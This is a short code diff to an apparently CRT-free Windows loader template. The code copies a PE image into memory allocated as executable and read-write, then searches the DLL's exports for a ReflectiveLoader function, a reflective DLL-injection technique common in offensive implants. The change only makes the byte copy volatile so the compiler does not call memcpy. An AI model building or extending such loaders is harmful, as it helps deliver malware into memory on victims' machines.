@@ -88,8 +88,14 @@ void WinMainCRTStartup(void)
 	flat = (unsigned char *)VirtualAlloc(NULL, alloc, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
 	if (flat == NULL)
 		bw_die(7);
-	for (i = 0; i < (DWORD)len; i++)
-		flat[i] = pe[i];
+	/* volatile: a plain byte copy folds into a memcpy call, and this
+	 * template links CRT-free (kernel32 only) */
+	{
+		volatile unsigned char *d = (volatile unsigned char *)flat;
+		unsigned char *src2 = pe;
+		for (i = 0; i < (DWORD)len; i++)
+			d[i] = src2[i];
+	}
 
 	/* walk the DLL exports for ReflectiveLoader */
 	lfanew = *(DWORD *)(flat + 0x3C);
